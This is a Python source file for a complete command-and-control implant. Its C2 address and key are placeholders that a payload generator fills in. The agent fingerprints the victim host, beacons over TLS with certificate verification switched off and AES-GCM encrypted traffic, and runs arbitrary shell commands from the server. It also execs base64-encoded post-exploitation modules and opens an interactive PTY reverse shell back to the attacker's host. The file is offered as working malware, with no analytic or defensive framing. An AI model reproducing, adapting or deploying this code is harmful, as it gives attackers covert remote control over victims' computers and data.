import socket, threading, time, json, uuid, struct, subprocess, sys, os, ssl, base64, platform

# Embedded Configuration (Replaced by Payload Generator)
C2_IP, C2_PORT, AES_KEY_B64, SLEEP_INTERVAL = "##C2_IP##", ##C2_PORT##, "##AES_KEY_B64##", 5

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class Crypto:
    """AES-256-GCM encryption utilities."""
    @staticmethod
    def encrypt(k, d): 
        n = os.urandom(12)
        return n + AESGCM(k).encrypt(n, d, None)
    
    @staticmethod
    def decrypt(k, d): 
        return AESGCM(k).decrypt(d[:12], d[12:], None)

class C2Agent:
    """Main C2 agent for communication and task execution."""
    def __init__(self, ip, port, key, sleep):
        self.server_ip, self.server_port, self.key, self.sleep = ip, int(port), base64.b64decode(key), int(sleep)
        self.agent_id, self.running = self._get_agent_id(), True
        self.results_to_send = []

    def _get_agent_id(self):
        """Generate unique agent ID based on system characteristics."""
        try:
            if platform.system() == "Windows": 
                return subprocess.check_output('wmic csproduct get uuid', stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            if os.path.exists("/var/lib/dbus/machine-id"): 
                return open("/var/lib/dbus/machine-id", "r").read().strip()
            if platform.system() == "Darwin": 
                return subprocess.check_output(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"], stderr=subprocess.DEVNULL).decode().split('IOPlatformUUID" = "')[1].split('"')[0]
        except Exception: 
            pass
        return str(uuid.uuid4())

    def _get_metadata(self):
        """Collect system metadata."""
        user = "N/A"
        try:
            user = os.getlogin()
        except Exception:
            user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        
        return {
            "id": self.agent_id, 
            "hostname": socket.gethostname(), 
            "user": user, 
            "platform": platform.system(), 
            "pid": os.getpid()
        }

    def send_with_length(self, sock, data): 
        """Send data with 4-byte length prefix."""
        sock.sendall(struct.pack('>I', len(data)) + data)
    
    def recv_with_length(self, sock):
        """Receive length-prefixed data."""
        try:
            raw_len = sock.recv(4)
            if not raw_len: 
                return None
            msg_len = struct.unpack('>I', raw_len)[0]
            data = b''
            while len(data) < msg_len:
                more = sock.recv(msg_len - len(data))
                if not more: 
                    return None
                data += more
            return data
        except (socket.error, struct.error): 
            return None

    def run_shell_command(self, task):
        """Execute shell command and collect output."""
        command = task.get('command')
        output = ""
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
        except Exception as e:
            output = f"Shell command failed: {e}"
        
        self.results_to_send.append({
            'task_id': task.get('task_id'), 
            'type': 'shell', 
            'output': output
        })

    def run_module(self, task):
        """Execute post-exploitation module from server."""
        try:
            module_code = base64.b64decode(task.get('module_code')).decode()
            module_globals = {
                '__name__': '__main__', 
                'sys': sys, 
                'os': os, 
                'platform': platform, 
                'subprocess': subprocess, 
                'base64': base64, 
                'io': __import__('io')
            }
            
            import ast
            tree = ast.parse(module_code)
            class_name = next((node.name for node in ast.walk(tree) if isinstance(node, ast.ClassDef)), None)
            
            if not class_name: 
                raise ValueError("No class found in module")
            
            exec(module_code, module_globals)
            main_class = module_globals[class_name]
            output = main_class.run_remote(task.get('args'))
            
        except Exception as e:
            output = f"Module execution failed: {e}"
        
        self.results_to_send.append({
            'task_id': task.get('task_id'), 
            'type': 'module', 
            'output': output
        })

    def start_interactive_shell(self):
        """Start interactive PTY shell session."""
        if platform.system() == "Windows":
            self.results_to_send.append({
                'task_id': 'N/A', 
                'type': 'shell', 
                'output': 'PTY shell not supported on Windows.'
            })
            return
        
        import pty, select
        
        shell_sock = self._connect_to_server()
        if not shell_sock: 
            return
        
        try:
            shell_sock.sendall(f"SHELL_INIT:{self.agent_id}\n".encode())
            master, slave = pty.openpty()
            shell_path = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            p = subprocess.Popen([shell_path, '-i'], preexec_fn=os.setsid, stdin=slave, stdout=slave, stderr=slave)
            
            while p.poll() is None and self.running:
                r, _, _ = select.select([shell_sock, master], [], [], 0.2)
                if shell_sock in r:
                    data = shell_sock.recv(1024)
                    if not data: 
                        break
                    os.write(master, data)
                if master in r:
                    data = os.read(master, 1024)
                    if not data: 
                        break
                    shell_sock.sendall(data)
                    
        except Exception: 
            pass
        finally:
            if shell_sock: 
                shell_sock.close()

    def process_task(self, task):
        """Process task from C2 server."""
        task_type = task.get('type')
        
        if task_type == 'kill': 
            self.running = False
        elif task_type == 'shell':
            self.run_shell_command(task)
        elif task_type == 'interactive_shell':
            threading.Thread(target=self.start_interactive_shell, daemon=True).start()
        elif task_type == 'module':
            self.run_module(task)

    def _connect_to_server(self):
        """Establish SSL/TLS connection to C2 server."""
        try:
            context = ssl.create_default_context()
            context.check_hostname, context.verify_mode = False, ssl.CERT_NONE
            sock = socket.create_connection((self.server_ip, self.server_port))
            return context.wrap_socket(sock, server_hostname=self.server_ip)
        except (socket.error, ssl.SSLError): 
            return None

    def run(self):
        """Main agent loop - beaconing and task processing."""
        while self.running:
            ssock = self._connect_to_server()
            if ssock:
                try:
                    beacon = {
                        'id': self.agent_id, 
                        'metadata': self._get_metadata(), 
                        'results': self.results_to_send
                    }
                    self.results_to_send = []
                    
                    self.send_with_length(ssock, Crypto.encrypt(self.key, json.dumps(beacon).encode()))
                    
                    encrypted_response = self.recv_with_length(ssock)
                    if encrypted_response:
                        response = json.loads(Crypto.decrypt(self.key, encrypted_response).decode())
                        for task in response.get('tasks', []): 
                            self.process_task(task)
                            
                except Exception: 
                    pass
                finally: 
                    ssock.close()
            
            time.sleep(self.sleep)

if __name__ == "__main__":
    C2Agent(C2_IP, C2_PORT, AES_KEY_B64, SLEEP_INTERVAL).run()